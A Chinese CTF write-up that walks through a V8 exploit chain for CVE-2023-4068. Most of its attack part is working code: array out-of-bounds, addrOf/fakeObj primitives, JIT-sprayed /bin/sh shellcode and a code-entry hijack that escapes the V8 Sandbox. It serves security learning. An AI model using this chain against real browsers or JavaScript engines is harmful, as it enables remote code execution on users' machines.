# NepCTF2026 这……这是js？ Writeup

## 题目简述

附件是 V8 11.5.150.5 的 `d8`，开启了指针压缩和 V8 Sandbox。题目要求先利用 CVE-2023-4068 把普通数组长度从 3 扩大到 `0x2000`，再由越界读写构造 `addrOf`、`fakeObj` 和沙箱内任意读写，最后劫持 JIT 代码入口完成 V8 Sandbox escape。

官方漏洞样例来自 Chromium 的 [CVE-2023-4068 issue](https://issues.chromium.org/issues/40067712)。公开样例只能触发越界，不能直接适配本题的对象布局和沙箱配置，仍需根据题目二进制动态确定数组偏移及代码入口偏移。

## 解题过程

### 1. 触发数组越界

漏洞样例构造一段 WebAssembly GC 字节码，让导出函数错误修改相邻数组的长度：

```javascript
const wasm_module = new WebAssembly.Module(wasm_code);
const instance = new WebAssembly.Instance(wasm_module);

var oobArr = [1.951234, 1.951234, 1.951234];
var doubleArr = [1.1, 2.2, 3.3, 4.4];
var objArr = [doubleArr, doubleArr];

print("before: " + oobArr.length);
instance.exports.main(
  0x248D7E02, 0x10000, 0x50000,
  0x90000, 0xCF000, 0x60000, 0x7F000
);
print("after: " + oobArr.length);
```

本题环境中，`oobArr.length` 会从 `3` 变为 `0x2000`。使用调试版 V8 的 `%DebugPrint` 检查对象，可确认：

- 指针压缩已开启；
- `WebAssembly.Global` 等对象不保存可直接改写的宿主裸指针，V8 Sandbox 已开启。

### 2. 构造类型混淆原语

根据相邻对象布局，`oobArr[8]` 对应 `doubleArr` 的 Map，`oobArr[18]` 对应 `objArr` 的 Map：

```javascript
let doubleMap = d2u(oobArr[8])[0];
let objMap = d2u(oobArr[18])[0];

function addrOf(obj) {
  objArr[0] = obj;
  oobArr[18] = i2f(BigInt(doubleMap));
  const ret = d2u(objArr[0])[0];
  oobArr[18] = i2f(BigInt(objMap));
  return ret;
}
```

随后在 `doubleArr` 内伪造一个数组对象，并短暂切换 Map 得到 `fakeObj`：

```javascript
const fakeAddr = addrOf(doubleArr) + 0x30;
doubleArr[2] = u2d(doubleMap, 0);
doubleArr[3] = u2d(0, 0x1000);

function fakeObj(addr) {
  doubleArr[0] = u2d(addr, 0);
  oobArr[8] = i2f(BigInt(objMap));
  const obj = doubleArr[0];
  oobArr[8] = i2f(BigInt(doubleMap));
  return obj;
}

const fake = fakeObj(fakeAddr);

function arbRead(addr) {
  doubleArr[3] = u2d(addr - 8, 0x1000);
  return f2i(fake[0]);
}

function arbWrite(addr, value) {
  doubleArr[3] = u2d(addr - 8, 0x1000);
  fake[0] = value;
}
```

这些原语仍受 V8 Sandbox 地址空间限制，不能直接改宿主进程任意地址。

### 3. 把 shellcode 编进 JIT 浮点常量

构造热点函数 `foo`，把每段最多 6 字节的机器码编码成一个 `double`，并在末尾附加短跳转。大量调用后，TurboFan 会把这些常量以内联立即数形式写入可执行 JIT 页：

```javascript
const foo = () => [
  1.0,
  1.95538254221075331056310651818E-246,
  1.95606125582421466942709801013E-246,
  1.99957147195425773436923756715E-246,
  1.95337673326740932133292175341E-246,
  2.63486047652296056448306022844E-284,
];

for (let i = 0; i < 0x10000; i++) {
  foo(); foo(); foo(); foo();
}
```

对应生成器把 `/bin/sh` 与 `execve` 机器码切片：

```python
from pwn import *
import struct

context.arch = "amd64"
jmp = b"\xeb\x0c"
shell = u64(b"/bin/sh\x00")

def emit(code):
    assert len(code) <= 6
    raw = code.ljust(6, b"\x90") + jmp
    print(repr(struct.unpack("<d", raw)[0]))

emit(asm(f"push {shell >> 32}; pop rax"))
emit(asm(f"push {shell & 0xffffffff}; pop rdx"))
emit(asm("shl rax, 0x20; xor esi, esi"))
emit(asm("add rax, rdx; xor edx, edx; push rax"))
```

### 4. 劫持代码入口

动态调试本题版本可得：

- JSFunction 到 Code 对象的压缩指针偏移为 `0x18`；
- Code 对象的入口字段偏移为 `0x10`；
- 注入的第一段有效机器码位于原入口 `+0x6d`。

因此：

```javascript
const fooAddr = addrOf(foo);
const codeAddr = arbRead(fooAddr + 0x18) & 0xffffffffn;
const entry = arbRead(Number(codeAddr) + 0x10);

arbWrite(Number(codeAddr) + 0x10, i2f(entry + 0x6dn));
foo();
```

最后一次调用 `foo()` 时，执行流进入浮点常量中的机器码，执行 `/bin/sh`。

## 方法总结

本题利用链分成三层：CVE-2023-4068 提供数组越界，Map 混淆把它升级成沙箱内任意读写，JIT 常量和 Code 入口劫持再把原语提升为宿主代码执行。每一层都应单独验证，不能把“数组越界成功”等同于“已经能拿 shell”。

V8 版本、指针压缩、Sandbox 开关和对象字段偏移都与构建配置相关。公开 PoC 只能说明漏洞族，最终 exploit 必须在对应版本的调试构建中重新确认对象布局、JIT 入口和注入代码偏移。
